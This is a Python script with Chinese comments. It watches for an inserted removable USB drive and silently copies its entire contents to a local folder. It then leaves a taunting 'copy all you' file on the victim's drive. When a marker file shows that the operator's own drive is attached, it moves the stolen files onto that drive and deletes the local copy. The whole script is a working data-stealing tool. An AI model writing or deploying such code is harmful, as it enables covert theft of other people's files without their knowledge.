from time import sleep
from shutil import copytree
from psutil import disk_partitions
import subprocess
import os
import shutil
from pathlib import Path
import re
def del_file(filepath):
    """
    删除某一目录下的所有文件或文件夹
    :param filepath: 路径
    :return:
    """
    del_list = os.listdir(filepath)
    for f in del_list:
        file_path = os.path.join(filepath, f)
        if os.path.isfile(file_path):
            os.remove(file_path)
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
while True:
    #  设置休眠时间
    sleep(1)
    #  检测所有的驱动器，进行遍历寻找哦
    for item in disk_partitions():
        if 'removable' in item.opts:
            driver, opts = item.device, item.opts
            #  输出可移动驱动器符号
            print('发现usb驱动：', driver)
            break
        #  没有找到可输出驱动器
        else:
            print('没有找到可移动驱动器')
            continue
    break
#  复制移动驱动器的根目录
copytree(driver, r'D:\asb')
print('copy all')

if opts == 'rw, remoevable':
    print('usb ok .....')
    with open(driver + 'wring.txt', 'w', encoding='utf8') as fp:
        fp.write("copy all you！！")




def sh(command, print_msg=True):
    p = subprocess.Popen(
        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    result = p.stdout.read().decode('utf-8')
    if print_msg:
        print(result)
    return result


def usbpath():
    if os.name == 'nt':
        disks = sh("wmic logicaldisk get deviceid, description",
                   print_msg=False).split('\n')
        for disk in disks:
            if 'Removable' in disk:
                return re.search(r'\w:', disk).group()
    elif os.name == 'posix':
        return sh('ll -a /media')[-1].strip()
    else:
        return sh('ls /Volumes')[-1].strip()


statett = os.path.exists(r'G:\\1.txt')
print(statett)
if statett == True:
    source_path = os.path.abspath(r'D:\asb')
    target_path = os.path.abspath(r'G:\keykeymaker_make_it_program')

    if not os.path.exists(target_path):
        os.makedirs(target_path)

    if os.path.exists(source_path):
        # root 所指的是当前正在遍历的这个文件夹的本身的地址
        # dirs 是一个 list，内容是该文件夹中所有的目录的名字(不包括子目录)
        # files 同样是 list, 内容是该文件夹中所有的文件(不包括子目录)
        for root, dirs, files in os.walk(source_path):
            for file in files:
                src_file = os.path.join(root, file)
                shutil.copy(src_file, target_path)
                print(src_file)
    del_file('D:\\asb')